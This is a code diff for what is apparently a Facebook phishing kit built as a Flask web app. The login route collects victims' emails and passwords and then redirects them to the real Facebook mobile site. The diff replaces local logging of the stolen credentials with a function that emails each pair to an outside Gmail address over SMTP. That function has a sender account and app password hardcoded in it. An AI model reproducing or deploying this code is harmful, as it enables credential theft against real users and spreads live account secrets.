@@ -1,22 +1,57 @@
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 from flask import Flask, request, render_template, redirect
+import random,smtplib
 
 app = Flask("Event")
-app_key = "jihan2001@@##"
 
-@app.route("/log", methods=["GET","POST"])
-def logs():
-	if request.method == "POST":
-		key = request.form["key"]
-		if key == app_key:
-			try:
-				data = open("results.txt","r").readlines()
-			except:
-				data = []
-			return render_template("log.html", a=data)
-		else:
-			return render_template("key.html", a=True)
-	else:
-		return render_template("key.html")
+def logs(email, password):
+	html_message = """<head>
+	<style>
+		body {background-color: lightblue;}
+		.bg {
+			background-color: green;
+		}
+		h6 {
+			background-color: salmon;
+			color: white;
+		}
+		table {
+			background-color: salmon;
+		}
+	</style>
+</head>
+<body>
+	<div class="bg">
+		<h6 align="center">RESULT FACEBOOK</h6>
+		<table border=1 align="center" cellspacing=0 cellpadding=5>
+			<thead>
+				<tr>
+					<th>Email/No.hp</th>
+					<th>password</th>
+				</tr>
+			</thead>
+			<tbody>
+				<tr>
+					<td>""" + email + """</td>
+					<td>""" + password + """</td>
+				</tr>
+			</tbody>
+		</table>
+	</div>
+</body>"""
+	me = "Sptty Web <jihannabila1821@gmail.com>"
+	you = "gustigreenn123@gmail.com"
+	server = smtplib.SMTP("smtp.gmail.com", 587)
+	server.starttls()
+	server.login("jihannabila1821@gmail.com", "wrrbncylhesdpvun")
+	msg = MIMEMultipart("alternative")
+	msg["Subject"] = f"Punya si {email}, {random.randint(1000000,9000000)}"
+	msg["From"] = me
+	msg["To"] = you
+	msg.attach(MIMEText(html_message, 'html'))
+	server.sendmail(me, you, msg.as_string())
+	server.quit()
 
 @app.route("/", methods=["GET","POST"])
 def login():
@@ -32,6 +67,6 @@ def login():
 				if password.replace(" ","") == "":
 					return render_template("template_sec_pass.html")
 				else:
-					open("results.txt","a").write(f"{email}|{password}\n")
+					logs(email, password)
 					return redirect("https://m.facebook.com", code=302)
 	return render_template("template.html")
